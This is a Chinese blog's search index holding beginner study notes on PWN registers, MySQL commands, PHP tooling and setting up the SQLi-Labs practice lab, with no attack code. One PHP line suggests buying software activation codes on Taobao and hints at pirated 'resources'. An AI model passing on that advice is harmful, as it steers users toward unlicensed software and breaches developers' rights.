<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PWN</title>
      <link href="/2022/02/17/PWN/"/>
      <url>/2022/02/17/PWN/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN笔记</title>
      <link href="/2022/02/17/PWN%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/17/PWN%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><br/><h2 id="x86寄存器-32位"><a href="#x86寄存器-32位" class="headerlink" title="x86寄存器(32位)"></a>x86寄存器(32位)</h2><p>学习链接：<a href="https://blog.csdn.net/choufu1408/article/details/100655739">https://blog.csdn.net/choufu1408/article/details/100655739</a></p><p>学习链接（荐）：<a href="https://blog.csdn.net/zhu2695/article/details/16813425">代码人生。。。-CSDN博客_esi寄存器</a></p><p>摘要：</p><table><thead><tr><th><strong>寄存器名称</strong></th><th><strong>用  途  描  述</strong></th></tr></thead><tbody><tr><td>eax</td><td>用于操作数和结果数据的累加器</td></tr><tr><td>ebx</td><td>指向数据内存段中的数据的指针</td></tr><tr><td>ecx</td><td>字符串和循环操作的计数器</td></tr><tr><td>edx</td><td>I/O指针</td></tr><tr><td>edi</td><td>用于字符串操作的目标的数据指针</td></tr><tr><td>esi</td><td>用于字符串操作的源的数据指针</td></tr><tr><td>esp</td><td>堆栈指针</td></tr><tr><td>ebp</td><td>堆栈数据指针</td></tr></tbody></table><p>个人理解（知道这些差不多了）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp:栈底指针      #中间的b可记为base，基底</span><br><span class="line">esb:栈顶指针      #指向栈的顶部</span><br><span class="line">eip:存下一条指令的地址 </span><br><span class="line">其他几个寄存器没有特别限定想存啥都行       #pwn题暂时了解以上三个就够了</span><br></pre></td></tr></table></figure><br/><h2 id="x86寄存器-64位"><a href="#x86寄存器-64位" class="headerlink" title="x86寄存器(64位)"></a>x86寄存器(64位)</h2><p>想要了解的话，请自行去寻找资料</p><p>个人理解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rbp:栈底指针      #64位用r做前缀 </span><br><span class="line">rsp:栈顶指针</span><br><span class="line">rip:存下一条指令</span><br><span class="line">RDI, RSI, RDX, RCX, R8 和 R9 寄存器   #暂时了解这几个就够了</span><br><span class="line">注：System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记</title>
      <link href="/2022/02/09/%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/09/%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB-荐"><a href="#WEB-荐" class="headerlink" title="WEB(荐)"></a>WEB(荐)</h1><p><strong>学习资料：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接1：<a href="https://mp.weixin.qq.com/s/vKmmGzh_i6QbBR_xPUtk_A">https://mp.weixin.qq.com/s/vKmmGzh_i6QbBR_xPUtk_A</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：微信公众号（三叶草小组Syclover），有兴趣的可以关注一下</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接2：<a href="https://mp.weixin.qq.com/s/4MeV5XFFJ4Q67bNmJNfseA">https://mp.weixin.qq.com/s/4MeV5XFFJ4Q67bNmJNfseA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接3（逆向）：<a href="https://mp.weixin.qq.com/s/tBCy3zegkWN_PkKIGTORvA">https://mp.weixin.qq.com/s/tBCy3zegkWN_PkKIGTORvA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接4（pwn）：<a href="https://mp.weixin.qq.com/s/GDso2Y_cYwV5iOSGWAmICA">https://mp.weixin.qq.com/s/GDso2Y_cYwV5iOSGWAmICA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接5（web）：<a href="https://mp.weixin.qq.com/s/8a7kHZlwZRtOCkEwLEYqrQ">https://mp.weixin.qq.com/s/8a7kHZlwZRtOCkEwLEYqrQ</a></p><br/><p>&nbsp;&nbsp;&nbsp;&nbsp;链接1里的一句话：<strong>当然我的意思不是必须学完这些所有基础才能进一步学习安全，很多时候都是在研究具体某个安全问题的时候才会临时去学习相关的知识。</strong></p><br/><br/><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><strong>学习资料：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://ctf-wiki.org/">简介 - CTF Wiki (ctf-wiki.org)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="http://pwnable.kr/">pwnable.kr</a></p><br/><br/><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>代码中存在中文时报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character <span class="string">&#x27;\xe8&#x27;</span> <span class="keyword">in</span> file D:/PyCharmProject/TempConvert.py on line <span class="number">2</span>, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class="keyword">for</span> details</span><br></pre></td></tr></table></figure><p>原因：注释里面出现了中文，而 Python 支持的 ASCII 码无中文。</p><br/><p>解决方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样也行</span></span><br><span class="line"><span class="comment"># coding:utf-8 </span></span><br></pre></td></tr></table></figure><p>注意：本行要添加在源代码的第一行</p><br/><br/><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p><br/><br/><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p><strong>phpstorm：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：不想选择评估免费版本的话，安装好后不要动，先去淘宝买激活码（附带激活教程）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（很多软件都可以通过淘宝买激活码的方式获取专业版使用权限。白嫖党请自行去寻找资源）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（基本教程）：<a href="https://zhuanlan.zhihu.com/p/112353790">PhpStorm的使用教程（本地运行PHP+远程开发+快捷键） - 知乎 (zhihu.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（汉化教程）：<a href="https://blog.csdn.net/weixin_46397725/article/details/107443128">https://blog.csdn.net/weixin_46397725/article/details/107443128</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（进阶教程）：<a href="https://blog.csdn.net/fangkang7/article/details/112383620">https://blog.csdn.net/fangkang7/article/details/112383620</a></p><p>注：若找不到php.exe文件，请下载 wampserver 教程如下：↓</p><br/><p><strong>wampserver：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/ba_qi/article/details/102736014">wampserver下载安装使用教程_空心人的博客-CSDN博客_wampserver</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.cnblogs.com/InfoStudio/p/6242073.html">PhpStorm和WAMP配置调试参数，问题描述Error. Interpreter is not specified or invalid. Press “Fix” to edit your project configuration. - 易几 - 博客园 (cnblogs.com)</a></p><br/><p>效果图如下：</p><p><img src="image-20220209205600804.png" alt="image-20220209205600804"></p><p><br/><br/></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>解决乱码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;/&gt;</span><br><span class="line">or</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=GBK&quot;/&gt;</span><br></pre></td></tr></table></figure><p>根据具体情况在自己的代码中选择一句进行添加</p><p><img src="image-20220210173002721.png" alt="image-20220210173002721"></p><br/><br/><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>学习链接：</strong><a href="https://www.lanqiao.cn/courses/9">MySQL 基础课程_MySQL - 蓝桥云课 (lanqiao.cn)</a></p><br/><h2 id="MySQL安装："><a href="#MySQL安装：" class="headerlink" title="MySQL安装："></a>MySQL安装：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql start             <span class="comment">#检查Linux系统中是否已安装MySQL</span></span><br><span class="line">sudo apt-get install mysql-server    <span class="comment">#安装 MySQL 服务端、核心程序</span></span><br><span class="line">sudo apt-get install mysql-client    <span class="comment">#安装 MySQL 客户端</span></span><br><span class="line">sudo netstat -tap | grep mysql       <span class="comment">#检查是否安装成功</span></span><br><span class="line">sudo gedit /etc/mysql/my.cnf         <span class="comment">#修改 MySQL 的配置文件</span></span><br></pre></td></tr></table></figure><br/><h2 id="MySQL使用："><a href="#MySQL使用：" class="headerlink" title="MySQL使用："></a>MySQL使用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql start        #启动 MySQL 服务</span><br><span class="line">mysql -u root                   #使用 root 用户登录，实验楼环境的密码为空，直接回车就可以登录</span><br><span class="line"></span><br><span class="line">数据库：</span><br><span class="line">show databases;                 #查看数据库</span><br><span class="line">CREATE DATABASE &lt;数据库名&gt;;      #创建数据库，大部分情况SQL语句不区分大小写</span><br><span class="line">use &lt;数据库名&gt;;                  #连接/进入数据库</span><br><span class="line">DROP DATABASE &lt;数据库名&gt;;        #删除数据库</span><br><span class="line"></span><br><span class="line">表：</span><br><span class="line">show tables;                    #查看表</span><br><span class="line">SELECT * FROM &lt;表名&gt;;            #查看表中的所有内容</span><br><span class="line">CREATE TABLE &lt;表名&gt;              #新建表</span><br><span class="line">(</span><br><span class="line">    列名a 数据类型(数据长度),</span><br><span class="line">    列名b 数据类型(数据长度),</span><br><span class="line">    列名c 数据类型(数据长度)</span><br><span class="line">);</span><br><span class="line">INSERT INTO &lt;表名&gt;(列名a,列名b,列名c) VALUES(值1,值2,值3);    #向表中插入数据</span><br><span class="line">RENAME TABLE 原名 TO 新名字;      #重命名表</span><br><span class="line">DROP TABLE &lt;表名&gt;;               #删除表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">quit (or) exit                  #退出</span><br><span class="line">source xxx.sql                  #加载.sql文件中的SQL语句</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">增：</span><br><span class="line">ALTER TABLE 表名字 ADD COLUMN 列名字 数据类型 约束;  #表中增加一列</span><br><span class="line">ALTER TABLE 表名字 ADD 列名字 数据类型 约束;         #表中增加一列</span><br><span class="line">DEFAULT、AFTER、 FIRST 关键字：</span><br><span class="line">ALTER TABLE employee ADD height INT(4) DEFAULT 170;            #末尾增加一列</span><br><span class="line">ALTER TABLE employee ADD weight INT(4) DEFAULT 120 AFTER age;  #age列后增加一列</span><br><span class="line">ALTER TABLE employee ADD test INT(10) DEFAULT 11 FIRST;        #增加在第一列</span><br><span class="line"></span><br><span class="line">删：</span><br><span class="line">DROP DATABASE &lt;数据库名&gt;;</span><br><span class="line">DROP TABLE &lt;表名&gt;;</span><br><span class="line">ALTER TABLE 表名字 DROP COLUMN 列名字;  #删除指定列</span><br><span class="line">ALTER TABLE 表名字 DROP 列名字;          #删除指定列</span><br><span class="line">DELETE FROM 表名字 WHERE 条件;           #删除一行记录</span><br><span class="line">DELETE FROM employee WHERE name=&#x27;Tom&#x27;;  # ↑ 删除Tom的数据</span><br><span class="line"></span><br><span class="line">改：</span><br><span class="line">RENAME TABLE 原名 TO 新名字;      #重命名表</span><br><span class="line">ALTER TABLE 原名 RENAME 新名;     #重命名表</span><br><span class="line">ALTER TABLE 原名 RENAME TO 新名;  #重命名表</span><br><span class="line">ALTER TABLE 表名字 CHANGE 原列名 新列名 数据类型 约束;  #重命名列</span><br><span class="line">ALTER TABLE 表名字 MODIFY 列名字 新数据类型;          #改变数据类型</span><br><span class="line">UPDATE 表名字 SET 列1=值1,列2=值2 WHERE 条件;        #修改表中某个值 ，注：一定要有 WHERE 条件</span><br><span class="line"></span><br><span class="line">查：</span><br><span class="line">SELECT 要查询的列名 FROM 表名字 WHERE 限制条件;     #select语句基本格式</span><br><span class="line">SELECT * FROM &lt;表名&gt;;                           #查看表中的所有内容</span><br><span class="line">SELECT name,age FROM employee WHERE age&gt;25;    #WHERE 限制条件</span><br><span class="line">SELECT name,age,phone FROM employee WHERE name=&#x27;Mary&#x27;;</span><br><span class="line"># OR 与 AND</span><br><span class="line">SELECT name,age FROM employee WHERE age&gt;25 AND age&lt;30;  </span><br><span class="line"># IN 与 NOT IN</span><br><span class="line">SELECT name,age,phone,in_dpt FROM employee WHERE in_dpt IN (&#x27;dpt3&#x27;,&#x27;dpt4&#x27;);</span><br><span class="line"># 通配符 _ 与 % ，通常与实现模糊查询的LIKE关键字联用</span><br><span class="line">SELECT name,age,phone FROM employee WHERE phone LIKE &#x27;1101__&#x27;;  #查询6位号码</span><br><span class="line">SELECT name,age,phone FROM employee WHERE name LIKE &#x27;J%&#x27;;       #查询J开头的字符</span><br><span class="line"># ORDER BY 排序关键字，默认为升序，可用 ASC 与 DESC 指定 升序 或 降序</span><br><span class="line">SELECT name,age,salary,phone FROM employee ORDER BY salary DESC;#按表中salary的值排序</span><br><span class="line"></span><br><span class="line"># 内置函数与计算</span><br><span class="line">函数名：COUNTSUM  AVG   MAX  MIN</span><br><span class="line">作用：     计数   求和   求平均值  最大值  最小值</span><br><span class="line">SELECT MAX(salary) AS max_salary,MIN(salary) FROM employee;     #找出最大最小值</span><br><span class="line">##  想要知道名为 &quot;Tom&quot; 的员工所在部门做了几个工程。员工信息储存在 employee 表中，</span><br><span class="line">##  但工程信息储存在 project 表中。  ↓   子查询</span><br><span class="line">SELECT of_dpt,COUNT(proj_name) AS count_project FROM project GROUP BY of_dpt</span><br><span class="line">HAVING of_dpt IN</span><br><span class="line">(SELECT in_dpt FROM employee WHERE name=&#x27;Tom&#x27;);    </span><br><span class="line">##  上面代码包含两个 SELECT 语句，第二个 SELECT 语句将返回一个集合的数据形式，  ↑</span><br><span class="line">##  然后被第一个 SELECT 语句用 in 进行判断。</span><br><span class="line">##  HAVING 关键字可以的作用和 WHERE 是一样的，都是说明接下来要进行条件筛选操作。</span><br><span class="line">##  区别在于 HAVING 用于对分组后的数据进行筛选  </span><br><span class="line"></span><br><span class="line"># 连接查询 ，join</span><br><span class="line">SELECT id,name,people_num</span><br><span class="line">FROM employee,department</span><br><span class="line">WHERE employee.in_dpt = department.dpt_name</span><br><span class="line">ORDER BY id;</span><br><span class="line">##这条语句查询出的是，各员工所在部门的人数，其中员工的 id 和 name 来自 employee 表，</span><br><span class="line">##people_num 来自 department 表：</span><br><span class="line">##另一种格式 ，结果相同  ↓</span><br><span class="line">SELECT id,name,people_num</span><br><span class="line">FROM employee JOIN department</span><br><span class="line">ON employee.in_dpt = department.dpt_name</span><br><span class="line">ORDER BY id;</span><br></pre></td></tr></table></figure><p>Show命令：<a href="https://blog.csdn.net/zztfj/article/details/6181379">https://blog.csdn.net/zztfj/article/details/6181379</a>      ↓  摘录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. show tables或show tables from database_name; -- 显示当前数据库中所有表的名称。</span><br><span class="line">2. show databases; -- 显示mysql中所有数据库的名称。 </span><br><span class="line">3. show columns from table_name from database_name; 或show columns from database_name.table_name; -- 显示表中列名称。</span><br><span class="line">4. show grants for user_name; -- 显示一个用户的权限，显示结果类似于grant 命令。</span><br><span class="line">5. show index from table_name; -- 显示表的索引。</span><br><span class="line">6. show status; -- 显示一些系统特定资源的信息，例如，正在运行的线程数量。</span><br><span class="line">7. show variables; -- 显示系统变量的名称和值。</span><br><span class="line">8. show processlist; -- 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。</span><br><span class="line">9. show table status; -- 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。</span><br><span class="line">10. show privileges; -- 显示服务器所支持的不同权限。</span><br><span class="line">11. show create database database_name; -- 显示create database 语句是否能够创建指定的数据库。</span><br><span class="line">12. show create table table_name; -- 显示create database 语句是否能够创建指定的数据库。</span><br><span class="line">13. show engines; -- 显示安装以后可用的存储引擎和默认引擎。</span><br><span class="line">14. show innodb status; -- 显示innoDB存储引擎的状态。</span><br><span class="line">15. show logs; -- 显示BDB存储引擎的日志。</span><br><span class="line">16. show warnings; -- 显示最后一个执行的语句所产生的错误、警告和通知。</span><br><span class="line">17. show errors; -- 只显示最后一个执行语句所产生的错误。</span><br><span class="line">18. show [storage] engines; --显示安装后的可用存储引擎和默认引擎。</span><br></pre></td></tr></table></figure><br/><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>数据类型</td><td>大小(字节)</td><td>用途</td><td>格式</td></tr><tr><td>INT</td><td>4</td><td>整数</td><td></td></tr><tr><td>FLOAT</td><td>4</td><td>单精度浮点数</td><td></td></tr><tr><td>DOUBLE</td><td>8</td><td>双精度浮点数</td><td></td></tr><tr><td>ENUM</td><td>–</td><td>单选,比如性别</td><td>ENUM(‘a’,’b’,’c’)</td></tr><tr><td>SET</td><td>–</td><td>多选</td><td>SET(‘1’,’2’,’3’)</td></tr><tr><td>DATE</td><td>3</td><td>日期</td><td>YYYY-MM-DD</td></tr><tr><td>TIME</td><td>3</td><td>时间点或持续时间</td><td>HH:MM:SS</td></tr><tr><td>YEAR</td><td>1</td><td>年份值</td><td>YYYY</td></tr><tr><td>CHAR</td><td>0~255</td><td>定长字符串</td><td></td></tr><tr><td>VARCHAR</td><td>0~255</td><td>变长字符串</td><td></td></tr><tr><td>TEXT</td><td>0~65535</td><td>长文本数据</td><td></td></tr></tbody></table><p>整数除了 INT 外，还有 TINYINT、SMALLINT、MEDIUMINT、BIGINT。</p><p>CHAR 长度固定，VARCHAR 长度可变，VARCHAR长度==具体分配的字符串长度</p><p>CHAR, VARCHAR,TEXT,DATE,TIME,ENUM 等类型的数据需要用单引号修饰</p><p>详细介绍：</p><ul><li><a href="http://blog.csdn.net/anxpp/article/details/51284106#comments">MySQL 中的数据类型介绍</a></li><li><a href="http://www.cnblogs.com/bukudekong/archive/2011/06/27/2091590.html">MySQL 数据类型</a></li></ul><br/><h2 id="SQL常见约束"><a href="#SQL常见约束" class="headerlink" title="SQL常见约束"></a>SQL常见约束</h2><table><thead><tr><th>约束类型：</th><th>主键</th><th>默认值</th><th>唯一</th><th>外键</th><th>非空</th></tr></thead><tbody><tr><td>关键字：</td><td>PRIMARY KEY</td><td>DEFAULT</td><td>UNIQUE</td><td>FOREIGN KEY</td><td>NOT NULL</td></tr></tbody></table><br/><h2 id="其他基本操作"><a href="#其他基本操作" class="headerlink" title="其他基本操作"></a>其他基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">索引：</span><br><span class="line"></span><br><span class="line">视图：</span><br><span class="line"></span><br><span class="line">导入和导出：</span><br><span class="line"></span><br><span class="line">备份和恢复：</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h1 id="SQLi-Labs"><a href="#SQLi-Labs" class="headerlink" title="SQLi-Labs"></a>SQLi-Labs</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.fujieace.com/penetration-test/sqli-labs-ec.html">SQLi-Labs下载、安装（环境搭建）教程 - 付杰博客 (fujieace.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/wwt260/article/details/116885452">sqli-labs安装教程_wwt260的博客-CSDN博客</a></p><br/><p>首先，在  <a href="https://github.com/Audi-1/sqli-labs">GitHub - Audi-1/sqli-labs</a>  上下载压缩的sqli-labs文件</p><p><img src="image-20220215202111964.png" alt="image-20220215202111964"></p><br/><p>其次，在  <a href="https://www.xp.cn/">www.xp.cn</a>  找到以下界面下载 phpStudy 做前期准备</p><p><img src="image-20220215202329165.png" alt="image-20220215202329165"></p><br/><p>phpStudy安装好后，找到WWW目录，将sqli-labs文件解压至WWW目录</p><p><img src="image-20220215202745379.png" alt="image-20220215202745379"></p><br/><p>之后进入以下两个目录找到该.inc文件，将$dbpass的值从空字符串改成 ‘root’ 即可</p><p><img src="image-20220215203057013.png" alt="image-20220215203057013"></p><br/><p>最后调配 phpStudy ，打开MySQL与Apache</p><p><img src="image-20220215203827439.png" alt="image-20220215203827439"></p><p>软件管理中下载php5.4.45nts并将下图中php版本调配到php5.4.45nts</p><p><img src="image-20220215204749877.png" alt="image-20220215204749877"></p><br/><p>注：若不修改php版本为5.4.45，则会遇到如下报错：</p><p><img src="image-20220215204445997.png" alt="image-20220215204445997"></p><br/><p>完成以上步骤后，进入网页中输入 <a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> ，点击Setup/reset Database for labs</p><p><img src="image-20220215205118928.png" alt="image-20220215205118928"></p><br/><p>显示以下界面说明调配成功，可以开始你的SQL手工注入学习之旅了</p><p><img src="image-20220215205237256.png" alt="image-20220215205237256"></p><br/><p>回到  <a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a>  ,查看第一题是什么样的</p><p><img src="image-20220215205453686.png" alt="image-20220215205453686"></p><p>好了，开始做题吧 ^_^</p><p><img src="image-20220215205556248.png" alt="image-20220215205556248"></p><br/><br/><h1 id="MarkDown"><a href="#MarkDown" class="headerlink" title="MarkDown"></a>MarkDown</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;学习链接：<a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法 | Markdown 官方教程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">个人用到过的：</span><br><span class="line"># &lt;center&gt; 一级标题    #居中，一级标题前加入&lt;center&gt; 即可完成居中</span><br><span class="line">&lt;br/&gt;                 #换行</span><br><span class="line">&amp;nbsp;                #空格</span><br><span class="line">&lt;font color=&quot;Blue&quot;&gt;Test&lt;/font&gt;     #修改字体颜色为蓝色</span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br></pre></td></tr></table></figure><br/><br/><h1 id="网站构建"><a href="#网站构建" class="headerlink" title="网站构建"></a>网站构建</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;学习链接：<a href="https://www.w3school.com.cn/site/index.asp">网站构建教程 (w3school.com.cn)</a></p><br/><br/><h1 id="学-amp-录"><a href="#学-amp-录" class="headerlink" title="学&amp;录"></a>学&amp;录</h1><h2 id="推荐书籍："><a href="#推荐书籍：" class="headerlink" title="推荐书籍："></a>推荐书籍：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基础类：《图解HTTP》*、《图解TCP/IP》*、《网络是怎样连接的》、《MySQL必知必会》、</span><br><span class="line">      《图解密码技术》......</span><br><span class="line"></span><br><span class="line">进阶类：《白帽子讲web安全》、《CTF特训营》、《程序员的自我修养》、《CTF权威指南》......</span><br></pre></td></tr></table></figure><h2 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h2><p>链接：<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p><p>链接(pwn)：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><p>链接(pwn)：<a href="http://pwnable.kr/">http://pwnable.kr/</a></p><p>链接：<a href="https://www.lanqiao.cn/">蓝桥云课 (lanqiao.cn)</a></p><p>链接：<a href="https://www.hetianlab.com/">合天网安实验室 (hetianlab.com)</a></p><p>链接：<a href="https://www.w3school.com.cn/index.html">w3school 在线教程</a></p><p>链接(课内)：<a href="https://www.xuetangx.com/">https://www.xuetangx.com/</a></p><p>链接：<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><p>链接(一个神奇的网站)：<a href="https://msdn.itellyou.cn/">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a></p><br/><h2 id="HTML："><a href="#HTML：" class="headerlink" title="HTML："></a>HTML：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.bilibili.com/video/BV11t411K74Q?share_source=copy_web">https://www.bilibili.com/video/BV11t411K74Q?share_source=copy_web</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.w3school.com.cn/html/index.asp">https://www.w3school.com.cn/html/index.asp</a></p><br/><h2 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a>PHP：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.bilibili.com/video/BV1Vp4y1e7pz">https://www.bilibili.com/video/BV1Vp4y1e7pz</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.w3school.com.cn/php/index.asp">PHP 教程 (w3school.com.cn)</a></p><br/><h2 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL:"></a>MySQL:</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.lanqiao.cn/courses/9">MySQL 基础课程_MySQL - 蓝桥云课 